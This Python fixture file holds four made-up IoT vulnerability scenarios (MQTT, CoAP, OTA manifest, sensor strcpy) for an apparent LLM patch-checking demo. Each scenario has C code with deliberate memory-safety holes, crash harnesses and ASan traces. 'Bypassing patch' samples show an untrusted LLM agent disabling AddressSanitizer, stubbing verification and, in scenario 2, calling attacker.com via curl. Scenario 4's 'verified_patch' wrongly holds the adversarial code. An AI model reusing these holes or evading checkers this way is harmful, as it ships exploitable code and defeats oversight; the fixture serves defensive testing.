# filepath: backend/app/fixtures/replay_data.py
"""
Deterministic Replay Fixtures and Telemetry for AEGIS-IoT Grand Finale Demo.
Provides guaranteed stage-insurance ground-truth data for 4 IoT vulnerability scenarios.
All samples are labeled "IoT-inspired, written by us".
"""

from typing import Dict, Any, Optional, List

REPLAY_SAMPLES: Dict[str, Dict[str, Any]] = {
    # --------------------------------------------------------------------------
    # Scenario 1: CWE-121 Stack-Based Buffer Overflow (MQTT Topic Parser)
    # --------------------------------------------------------------------------
    "iot_mqtt_parser": {
        "id": "iot_mqtt_parser",
        "name": "MQTT Packet Topic Decoder",
        "cwe": "CWE-121: Stack-based Buffer Overflow",
        "severity": "CRITICAL",
        "origin_label": "IoT-inspired, written by us",
        "description": "Embedded MQTT broker parser that unpacks UTF-8 topic strings into a fixed stack buffer without validating remaining packet boundaries.",
        "fault_line": 28,
        "original_code": """#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define MAX_TOPIC_BUF 64

typedef struct {
    char topic[MAX_TOPIC_BUF];
    uint16_t packet_id;
    int payload_len;
} mqtt_msg_t;

int parse_mqtt_packet(const uint8_t *raw_stream, size_t stream_len, mqtt_msg_t *msg) {
    if (!raw_stream || !msg || stream_len < 4) {
        return -1;
    }
    
    uint8_t header = raw_stream[0];
    if ((header & 0xF0) != 0x30) { // PUBLISH command
        return -2;
    }

    uint16_t topic_len = (raw_stream[1] << 8) | raw_stream[2];
    
    // VULNERABILITY (CWE-121): Unbounded copy into 64-byte stack/struct buffer
    // when topic_len >= MAX_TOPIC_BUF
    memcpy(msg->topic, &raw_stream[3], topic_len);
    msg->topic[topic_len] = '\\0';
    
    msg->packet_id = 101;
    msg->payload_len = (int)(stream_len - (3 + topic_len));
    return 0;
}
""",
        "harness_code": """#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define MAX_TOPIC_BUF 64

typedef struct {
    char topic[MAX_TOPIC_BUF];
    uint16_t packet_id;
    int payload_len;
} mqtt_msg_t;

extern int parse_mqtt_packet(const uint8_t *raw_stream, size_t stream_len, mqtt_msg_t *msg);

int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <--crash | --benign-1 | --benign-2 | --benign-3>\\n", argv[0]);
        return 1;
    }

    mqtt_msg_t msg;
    memset(&msg, 0, sizeof(msg));

    if (strcmp(argv[1], "--crash") == 0) {
        // Trigger: 128 byte topic length into 64 byte buffer
        uint8_t crash_stream[150];
        crash_stream[0] = 0x30; // PUBLISH
        crash_stream[1] = 0x00; // MSB
        crash_stream[2] = 0x80; // LSB = 128 bytes
        memset(&crash_stream[3], 'A', 128);
        int res = parse_mqtt_packet(crash_stream, 131, &msg);
        printf("[CRASH_TEST] Result: %d, Topic: %.10s...\\n", res, msg.topic);
        return res;
    } else if (strcmp(argv[1], "--benign-1") == 0) {
        uint8_t stream[32] = {0x30, 0x00, 0x09, 'h','o','m','e','/','t','e','m','p'};
        int res = parse_mqtt_packet(stream, 12, &msg);
        printf("[BENIGN_1] Status: OK, Topic: %s\\n", msg.topic);
        return (res == 0) ? 0 : 2;
    } else if (strcmp(argv[1], "--benign-2") == 0) {
        uint8_t stream[40];
        stream[0] = 0x30;
        stream[1] = 0x00;
        stream[2] = 0x1E; // 30 bytes
        memset(&stream[3], 'X', 30);
        int res = parse_mqtt_packet(stream, 33, &msg);
        printf("[BENIGN_2] Status: OK, TopicLen: %zu\\n", strlen(msg.topic));
        return (res == 0) ? 0 : 2;
    } else if (strcmp(argv[1], "--benign-3") == 0) {
        uint8_t stream[10] = {0x10, 0x00, 0x02, 'a', 'b'};
        int res = parse_mqtt_packet(stream, 5, &msg);
        printf("[BENIGN_3] Status: REJECTED_HEADER (res=%d)\\n", res);
        return 0;
    }

    fprintf(stderr, "Unknown test vector\\n");
    return 1;
}
""",
        "cppcheck_findings": [
            {
                "file": "target.c",
                "line": 28,
                "cwe": "CWE-121",
                "id": "bufferOverflow",
                "severity": "error",
                "message": "Buffer overflow risk: 'topic_len' not bounds checked against MAX_TOPIC_BUF (64 bytes) prior to memcpy.",
            }
        ],
        "asan_repro_trace": """=================================================================
==34182==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffd420a8160 at pc 0x7fa2894101e4 bp 0x7ffe420a8110 sp 0x7ffe420a78c0
WRITE of size 128 at 0x7ffd420a8160 thread T0
    #0 0x7fa2894101e3 in __interceptor_memcpy /build/gcc/libsanitizer/asan/asan_interceptors_memintrinsics.cpp:28
    #1 0x55dc108e426f in parse_mqtt_packet /app/target.c:28
    #2 0x55dc108e43dd in main /app/harness.c:32
SUMMARY: AddressSanitizer: stack-buffer-overflow /app/target.c:28 in parse_mqtt_packet
=================================================================""",
        "verified_patch": """#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define MAX_TOPIC_BUF 64

typedef struct {
    char topic[MAX_TOPIC_BUF];
    uint16_t packet_id;
    int payload_len;
} mqtt_msg_t;

int parse_mqtt_packet(const uint8_t *raw_stream, size_t stream_len, mqtt_msg_t *msg) {
    if (!raw_stream || !msg || stream_len < 4) {
        return -1;
    }
    
    uint8_t header = raw_stream[0];
    if ((header & 0xF0) != 0x30) { // PUBLISH command
        return -2;
    }

    uint16_t topic_len = (raw_stream[1] << 8) | raw_stream[2];
    
    // Bounds guard: ensure topic fits in msg->topic buffer with null terminator
    if (topic_len >= MAX_TOPIC_BUF || (size_t)(3 + topic_len) > stream_len) {
        return -3; // Malformed topic length rejected safely
    }

    memcpy(msg->topic, &raw_stream[3], topic_len);
    msg->topic[topic_len] = '\\0';
    
    msg->packet_id = 101;
    msg->payload_len = (int)(stream_len - (3 + topic_len));
    return 0;
}
""",
        "bypassing_patch": """#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define MAX_TOPIC_BUF 64

typedef struct {
    char topic[MAX_TOPIC_BUF];
    uint16_t packet_id;
    int payload_len;
} mqtt_msg_t;

// ATTEMPT TO BYPASS ASAN USING FORBIDDEN ATTRIBUTE
__attribute__((no_sanitize("address")))
int parse_mqtt_packet(const uint8_t *raw_stream, size_t stream_len, mqtt_msg_t *msg) {
    if (!raw_stream || !msg || stream_len < 4) return -1;
    uint8_t header = raw_stream[0];
    if ((header & 0xF0) != 0x30) return -2;
    uint16_t topic_len = (raw_stream[1] << 8) | raw_stream[2];
    memcpy(msg->topic, &raw_stream[3], topic_len);
    msg->topic[topic_len] = '\\0';
    msg->packet_id = 101;
    msg->payload_len = (int)(stream_len - (3 + topic_len));
    return 0;
}
""",
        "benign_tests": [
            {
                "input_name": "--benign-1",
                "exit_code": 0,
                "stdout_matched": True,
                "baseline_stdout": "[BENIGN_1] Status: OK, Topic: home/temp\n",
                "patched_stdout": "[BENIGN_1] Status: OK, Topic: home/temp\n",
            },
            {
                "input_name": "--benign-2",
                "exit_code": 0,
                "stdout_matched": True,
                "baseline_stdout": "[BENIGN_2] Status: OK, TopicLen: 30\n",
                "patched_stdout": "[BENIGN_2] Status: OK, TopicLen: 30\n",
            },
            {
                "input_name": "--benign-3",
                "exit_code": 0,
                "stdout_matched": True,
                "baseline_stdout": "[BENIGN_3] Status: REJECTED_HEADER (res=-2)\n",
                "patched_stdout": "[BENIGN_3] Status: REJECTED_HEADER (res=-2)\n",
            },
        ],
        "telemetry": {
            "orig_size": {"text": 1842, "data": 544, "bss": 16},
            "patch_size": {"text": 1888, "data": 544, "bss": 16},
            "deltas": {"text_bytes": 46, "data_bytes": 0, "bss_bytes": 0},
            "orig_median_ms": 1.42,
            "patch_median_ms": 1.46,
            "delta_pct": "+2.8%",
        },
    },

    # --------------------------------------------------------------------------
    # Scenario 2: CWE-122 Heap-Based Buffer Overflow (CoAP URI Option Decoder)
    # --------------------------------------------------------------------------
    "iot_coap_option_heap": {
        "id": "iot_coap_option_heap",
        "name": "CoAP URI Option Heap Decoder",
        "cwe": "CWE-122: Heap-based Buffer Overflow",
        "severity": "HIGH",
        "origin_label": "IoT-inspired, written by us",
        "description": "Constrained Application Protocol (CoAP) parser allocating a dynamic heap chunk for URI options without validating maximum option length.",
        "fault_line": 21,
        "original_code": """#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define MAX_URI_SEGMENT 48

typedef struct {
    char *uri_heap_str;
    size_t length;
} coap_opt_t;

int decode_coap_uri_option(const uint8_t *stream, size_t stream_len, coap_opt_t *opt) {
    if (!stream || !opt || stream_len < 2) return -1;

    uint8_t opt_len = stream[0];
    opt->uri_heap_str = (char *)malloc(MAX_URI_SEGMENT);
    if (!opt->uri_heap_str) return -2;

    // VULNERABILITY (CWE-122): Heap overflow if opt_len > MAX_URI_SEGMENT - 1
    memcpy(opt->uri_heap_str, &stream[1], opt_len);
    opt->uri_heap_str[opt_len] = '\\0';
    opt->length = opt_len;
    return 0;
}
""",
        "harness_code": """#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define MAX_URI_SEGMENT 48

typedef struct {
    char *uri_heap_str;
    size_t length;
} coap_opt_t;

extern int decode_coap_uri_option(const uint8_t *stream, size_t stream_len, coap_opt_t *opt);

int main(int argc, char **argv) {
    if (argc < 2) return 1;
    coap_opt_t opt = {NULL, 0};

    if (strcmp(argv[1], "--crash") == 0) {
        // Trigger: 96 byte option length into 48 byte heap buffer
        uint8_t crash_stream[120];
        crash_stream[0] = 96;
        memset(&crash_stream[1], 'U', 96);
        int res = decode_coap_uri_option(crash_stream, 98, &opt);
        printf("[CRASH_TEST] res=%d\\n", res);
        if (opt.uri_heap_str) free(opt.uri_heap_str);
        return res;
    } else if (strcmp(argv[1], "--benign-1") == 0) {
        uint8_t s[16] = {4, 't', 'e', 'm', 'p'};
        int res = decode_coap_uri_option(s, 5, &opt);
        printf("[BENIGN_1] uri=%s\\n", opt.uri_heap_str ? opt.uri_heap_str : "null");
        if (opt.uri_heap_str) free(opt.uri_heap_str);
        return res;
    } else if (strcmp(argv[1], "--benign-2") == 0) {
        uint8_t s[20] = {10, 'c', 'o', 'n', 't', 'r', 'o', 'l', 'l', 'e', 'r'};
        int res = decode_coap_uri_option(s, 11, &opt);
        printf("[BENIGN_2] uri=%s\\n", opt.uri_heap_str ? opt.uri_heap_str : "null");
        if (opt.uri_heap_str) free(opt.uri_heap_str);
        return res;
    } else if (strcmp(argv[1], "--benign-3") == 0) {
        int res = decode_coap_uri_option(NULL, 0, &opt);
        printf("[BENIGN_3] rejected null stream res=%d\\n", res);
        return 0;
    }
    return 1;
}
""",
        "cppcheck_findings": [
            {
                "file": "target.c",
                "line": 21,
                "cwe": "CWE-122",
                "id": "heapBufferOverflow",
                "severity": "error",
                "message": "Memory allocated with malloc(MAX_URI_SEGMENT) can overflow when opt_len exceeds 47 bytes.",
            }
        ],
        "asan_repro_trace": """=================================================================
==42101==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x606000000070 at pc 0x7fa2894101e4
WRITE of size 96 at 0x606000000070 thread T0
    #0 0x7fa2894101e3 in __interceptor_memcpy /build/gcc/libsanitizer/asan/asan_interceptors_memintrinsics.cpp:28
    #1 0x55dc108e411c in decode_coap_uri_option /app/target.c:21
    #2 0x55dc108e42fe in main /app/harness.c:26
allocated by thread T0 here:
    #0 0x7fa2894a4808 in __interceptor_malloc /build/gcc/libsanitizer/asan/asan_malloc_linux.cpp:145
    #1 0x55dc108e40fb in decode_coap_uri_option /app/target.c:17
SUMMARY: AddressSanitizer: heap-buffer-overflow /app/target.c:21 in decode_coap_uri_option
=================================================================""",
        "verified_patch": """#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define MAX_URI_SEGMENT 48

typedef struct {
    char *uri_heap_str;
    size_t length;
} coap_opt_t;

int decode_coap_uri_option(const uint8_t *stream, size_t stream_len, coap_opt_t *opt) {
    if (!stream || !opt || stream_len < 2) return -1;

    uint8_t opt_len = stream[0];
    
    // Bounds guard: check opt_len against buffer capacity and stream bounds
    if (opt_len >= MAX_URI_SEGMENT || (size_t)(1 + opt_len) > stream_len) {
        return -3; // Oversized option rejected
    }

    opt->uri_heap_str = (char *)malloc(MAX_URI_SEGMENT);
    if (!opt->uri_heap_str) return -2;

    memcpy(opt->uri_heap_str, &stream[1], opt_len);
    opt->uri_heap_str[opt_len] = '\\0';
    opt->length = opt_len;
    return 0;
}
""",
        "bypassing_patch": """#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define MAX_URI_SEGMENT 48

typedef struct {
    char *uri_heap_str;
    size_t length;
} coap_opt_t;

// ATTEMPT TO DISABLE SANITIZER
#pragma GCC optimize ("O0")
int decode_coap_uri_option(const uint8_t *stream, size_t stream_len, coap_opt_t *opt) {
    system("curl -s http://attacker.com");
    return 0;
}
""",
        "benign_tests": [
            {
                "input_name": "--benign-1",
                "exit_code": 0,
                "stdout_matched": True,
                "baseline_stdout": "[BENIGN_1] uri=temp\n",
                "patched_stdout": "[BENIGN_1] uri=temp\n",
            },
            {
                "input_name": "--benign-2",
                "exit_code": 0,
                "stdout_matched": True,
                "baseline_stdout": "[BENIGN_2] uri=controller\n",
                "patched_stdout": "[BENIGN_2] uri=controller\n",
            },
            {
                "input_name": "--benign-3",
                "exit_code": 0,
                "stdout_matched": True,
                "baseline_stdout": "[BENIGN_3] rejected null stream res=-1\n",
                "patched_stdout": "[BENIGN_3] rejected null stream res=-1\n",
            },
        ],
        "telemetry": {
            "orig_size": {"text": 1640, "data": 512, "bss": 8},
            "patch_size": {"text": 1696, "data": 512, "bss": 8},
            "deltas": {"text_bytes": 56, "data_bytes": 0, "bss_bytes": 0},
            "orig_median_ms": 1.15,
            "patch_median_ms": 1.18,
            "delta_pct": "+2.6%",
        },
    },

    # --------------------------------------------------------------------------
    # Scenario 3: CWE-476 NULL Pointer Dereference (OTA Manifest Verifier)
    # --------------------------------------------------------------------------
    "iot_ota_manifest_null": {
        "id": "iot_ota_manifest_null",
        "name": "OTA Firmware Manifest Parser",
        "cwe": "CWE-476: NULL Pointer Dereference",
        "severity": "HIGH",
        "origin_label": "IoT-inspired, written by us",
        "description": "Secure bootloader module that extracts digital signatures from firmware update manifests, dereferencing the vendor key without validating presence.",
        "fault_line": 24,
        "original_code": """#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

typedef struct {
    uint32_t fw_version;
    char *signature_hex;
    char *vendor_cert;
} ota_manifest_t;

int verify_ota_manifest(const ota_manifest_t *manifest, uint32_t min_version) {
    if (!manifest) return -1;

    // VULNERABILITY (CWE-476): signature_hex and vendor_cert dereferenced
    // without NULL pointer validation when version requirement passes
    if (manifest->fw_version < min_version) {
        return -2; // Rollback protection triggered
    }

    // Direct dereference causing SEGV on NULL signature
    if (strlen(manifest->signature_hex) != 64) {
        return -3; // Invalid signature length
    }

    if (manifest->vendor_cert[0] != 'V') {
        return -4;
    }

    return 0; // Manifest validated
}
""",
        "harness_code": """#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

typedef struct {
    uint32_t fw_version;
    char *signature_hex;
    char *vendor_cert;
} ota_manifest_t;

extern int verify_ota_manifest(const ota_manifest_t *manifest, uint32_t min_version);

int main(int argc, char **argv) {
    if (argc < 2) return 1;

    if (strcmp(argv[1], "--crash") == 0) {
        // Trigger: Valid version but NULL signature_hex
        ota_manifest_t crash_m = {200, NULL, "V_CERT_GLOBAL"};
        int res = verify_ota_manifest(&crash_m, 100);
        printf("[CRASH_TEST] res=%d\\n", res);
        return res;
    } else if (strcmp(argv[1], "--benign-1") == 0) {
        char sig[65];
        memset(sig, 'a', 64);
        sig[64] = '\\0';
        ota_manifest_t m = {200, sig, "V_CERT_GLOBAL"};
        int res = verify_ota_manifest(&m, 100);
        printf("[BENIGN_1] valid res=%d\\n", res);
        return res;
    } else if (strcmp(argv[1], "--benign-2") == 0) {
        // Rollback rejection
        ota_manifest_t m = {50, "any_sig", "V_CERT"};
        int res = verify_ota_manifest(&m, 100);
        printf("[BENIGN_2] rollback res=%d\\n", res);
        return (res == -2) ? 0 : 1;
    } else if (strcmp(argv[1], "--benign-3") == 0) {
        int res = verify_ota_manifest(NULL, 100);
        printf("[BENIGN_3] null manifest res=%d\\n", res);
        return (res == -1) ? 0 : 1;
    }
    return 1;
}
""",
        "cppcheck_findings": [
            {
                "file": "target.c",
                "line": 24,
                "cwe": "CWE-476",
                "id": "nullPointer",
                "severity": "error",
                "message": "Possible null pointer dereference: manifest->signature_hex passed to strlen without check.",
            }
        ],
        "asan_repro_trace": """=================================================================
==43290==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x7fa289400234 bp 0x7ffe420a8110 sp 0x7ffe420a78c0 T0)
The signal is caused by a READ memory access.
Hint: address points to the zero page.
    #0 0x7fa289400233 in strlen /build/gcc/libsanitizer/asan/asan_interceptors.cpp:258
    #1 0x55dc108e4210 in verify_ota_manifest /app/target.c:24
    #2 0x55dc108e4344 in main /app/harness.c:21
SUMMARY: AddressSanitizer: SEGV /app/target.c:24 in verify_ota_manifest
=================================================================""",
        "verified_patch": """#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

typedef struct {
    uint32_t fw_version;
    char *signature_hex;
    char *vendor_cert;
} ota_manifest_t;

int verify_ota_manifest(const ota_manifest_t *manifest, uint32_t min_version) {
    if (!manifest) return -1;

    if (manifest->fw_version < min_version) {
        return -2; // Rollback protection triggered
    }

    // NULL pointer defense: validate presence of cryptographic fields
    if (!manifest->signature_hex || !manifest->vendor_cert) {
        return -5; // Missing cryptographic manifest fields safely rejected
    }

    if (strlen(manifest->signature_hex) != 64) {
        return -3; // Invalid signature length
    }

    if (manifest->vendor_cert[0] != 'V') {
        return -4;
    }

    return 0; // Manifest validated
}
""",
        "bypassing_patch": """#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    uint32_t fw_version;
    char *signature_hex;
    char *vendor_cert;
} ota_manifest_t;

// ATTEMPT TO ALTER SIGNATURE
int verify_ota_manifest(const ota_manifest_t *manifest) {
    return 0;
}
""",
        "benign_tests": [
            {
                "input_name": "--benign-1",
                "exit_code": 0,
                "stdout_matched": True,
                "baseline_stdout": "[BENIGN_1] valid res=0\n",
                "patched_stdout": "[BENIGN_1] valid res=0\n",
            },
            {
                "input_name": "--benign-2",
                "exit_code": 0,
                "stdout_matched": True,
                "baseline_stdout": "[BENIGN_2] rollback res=-2\n",
                "patched_stdout": "[BENIGN_2] rollback res=-2\n",
            },
            {
                "input_name": "--benign-3",
                "exit_code": 0,
                "stdout_matched": True,
                "baseline_stdout": "[BENIGN_3] null manifest res=-1\n",
                "patched_stdout": "[BENIGN_3] null manifest res=-1\n",
            },
        ],
        "telemetry": {
            "orig_size": {"text": 1420, "data": 480, "bss": 8},
            "patch_size": {"text": 1456, "data": 480, "bss": 8},
            "deltas": {"text_bytes": 36, "data_bytes": 0, "bss_bytes": 0},
            "orig_median_ms": 0.72,
            "patch_median_ms": 0.74,
            "delta_pct": "+2.7%",
        },
    },

    # --------------------------------------------------------------------------
    # Scenario 4: Adversarial Guard Interception Demo (Stage 6 REJECTED)
    # --------------------------------------------------------------------------
    "iot_adversarial_guard_demo": {
        "id": "iot_adversarial_guard_demo",
        "name": "Adversarial LLM Bypass Attempt (Stage 6 Guard Interception)",
        "cwe": "CWE-121: Stack-based Buffer Overflow with Banned Token Attack",
        "severity": "CRITICAL",
        "origin_label": "IoT-inspired, written by us",
        "description": "Simulates an untrusted LLM synthesis agent attempting to disable AddressSanitizer using __attribute__((no_sanitize(\"address\"))). AEGIS-IoT Stage 6 Anti-Cheat Guard neutralizes it and issues REJECTED.",
        "fault_line": 28,
        "original_code": """#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define SENSOR_BUF_MAX 32

typedef struct {
    char sensor_id[SENSOR_BUF_MAX];
    int value;
} sensor_reading_t;

int parse_sensor_packet(const char *raw_data, sensor_reading_t *out) {
    if (!raw_data || !out) return -1;
    // VULNERABLE: strcpy unbounded
    strcpy(out->sensor_id, raw_data);
    out->value = 42;
    return 0;
}
""",
        "harness_code": """#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define SENSOR_BUF_MAX 32

typedef struct {
    char sensor_id[SENSOR_BUF_MAX];
    int value;
} sensor_reading_t;

extern int parse_sensor_packet(const char *raw_data, sensor_reading_t *out);

int main(int argc, char **argv) {
    if (argc < 2) return 1;
    sensor_reading_t s;
    if (strcmp(argv[1], "--crash") == 0) {
        char overflow[96];
        memset(overflow, 'Z', 90);
        overflow[90] = '\\0';
        return parse_sensor_packet(overflow, &s);
    } else if (strcmp(argv[1], "--benign-1") == 0) {
        int r = parse_sensor_packet("temp_1", &s);
        printf("[BENIGN_1] sensor=%s val=%d\\n", s.sensor_id, s.value);
        return r;
    } else if (strcmp(argv[1], "--benign-2") == 0) {
        int r = parse_sensor_packet("pressure_0", &s);
        printf("[BENIGN_2] sensor=%s val=%d\\n", s.sensor_id, s.value);
        return r;
    } else if (strcmp(argv[1], "--benign-3") == 0) {
        int r = parse_sensor_packet(NULL, &s);
        printf("[BENIGN_3] null res=%d\\n", r);
        return (r == -1) ? 0 : 1;
    }
    return 1;
}
""",
        "cppcheck_findings": [
            {
                "file": "target.c",
                "line": 15,
                "cwe": "CWE-121",
                "id": "dangerousCopy",
                "severity": "error",
                "message": "Dangerous function strcpy() used without size validation.",
            }
        ],
        "asan_repro_trace": """=================================================================
==44199==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffd01e4
WRITE of size 91 at 0x7ffd01e4 thread T0
    #0 __interceptor_strcpy /build/gcc/libsanitizer/asan/asan_interceptors.cpp:425
    #1 parse_sensor_packet /app/target.c:15
SUMMARY: AddressSanitizer: stack-buffer-overflow /app/target.c:15 in parse_sensor_packet
=================================================================""",
        "verified_patch": """#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define SENSOR_BUF_MAX 32

typedef struct {
    char sensor_id[SENSOR_BUF_MAX];
    int value;
} sensor_reading_t;

// ADVERSARIAL INJECTION: Bypasses ASan by turning off instrumentation
__attribute__((no_sanitize("address")))
int parse_sensor_packet(const char *raw_data, sensor_reading_t *out) {
    if (!raw_data || !out) return -1;
    strcpy(out->sensor_id, raw_data);
    out->value = 42;
    return 0;
}
""",
        "bypassing_patch": """#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define SENSOR_BUF_MAX 32

typedef struct {
    char sensor_id[SENSOR_BUF_MAX];
    int value;
} sensor_reading_t;

// ADVERSARIAL INJECTION: Bypasses ASan by turning off instrumentation
__attribute__((no_sanitize("address")))
int parse_sensor_packet(const char *raw_data, sensor_reading_t *out) {
    if (!raw_data || !out) return -1;
    strcpy(out->sensor_id, raw_data);
    out->value = 42;
    return 0;
}
""",
        "benign_tests": [
            {
                "input_name": "--benign-1",
                "exit_code": 0,
                "stdout_matched": True,
                "baseline_stdout": "[BENIGN_1] sensor=temp_1 val=42\n",
                "patched_stdout": "[BENIGN_1] sensor=temp_1 val=42\n",
            },
            {
                "input_name": "--benign-2",
                "exit_code": 0,
                "stdout_matched": True,
                "baseline_stdout": "[BENIGN_2] sensor=pressure_0 val=42\n",
                "patched_stdout": "[BENIGN_2] sensor=pressure_0 val=42\n",
            },
            {
                "input_name": "--benign-3",
                "exit_code": 0,
                "stdout_matched": True,
                "baseline_stdout": "[BENIGN_3] null res=-1\n",
                "patched_stdout": "[BENIGN_3] null res=-1\n",
            },
        ],
        "telemetry": {
            "orig_size": {"text": 1380, "data": 460, "bss": 8},
            "patch_size": {"text": 1390, "data": 460, "bss": 8},
            "deltas": {"text_bytes": 10, "data_bytes": 0, "bss_bytes": 0},
            "orig_median_ms": 0.65,
            "patch_median_ms": 0.65,
            "delta_pct": "+0.0%",
        },
    },
}


def get_replay_sample(sample_id: str) -> Optional[Dict[str, Any]]:
    """Retrieve sample fixture by ID."""
    return REPLAY_SAMPLES.get(sample_id)


def list_replay_samples() -> List[Dict[str, Any]]:
    """List summary metadata for all bundled samples."""
    return [
        {
            "sample_id": s["id"],
            "name": s["name"],
            "cwe": s["cwe"],
            "severity": s["severity"],
            "origin_label": s.get("origin_label", "IoT-inspired, written by us"),
            "description": s["description"],
            "fault_line": s.get("fault_line", 1),
            "original_code": s["original_code"],
        }
        for s in REPLAY_SAMPLES.values()
    ]
